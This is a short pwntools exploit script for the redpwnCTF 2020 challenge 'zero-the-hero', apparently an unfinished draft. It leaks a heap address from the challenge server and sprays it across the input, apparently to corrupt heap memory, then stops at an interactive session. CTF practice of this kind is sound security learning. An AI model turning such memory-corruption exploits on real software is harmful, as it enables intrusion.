#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./zero-the-hero"
LIBCNAME = "./libc.so.6"

hosts = ("2020.redpwnc.tf","localhost","localhost")
ports = (31643,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

## exploit ###########################################

def exploit():
  global c
  
  chunk_size = 0x10000
  str_size = 0x15000

  c.recvline()
  c.sendline(str(chunk_size))
  c.recvuntil("here: ")
  heap = int(c.recvline().rstrip(),16)
  print("[+] heap: "+hex(heap))
  c.recvline()
  c.sendline(str(chunk_size-8))
  c.recvline()
  raw_input("OK")
  c.send(p64(heap)*(str_size//8))


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
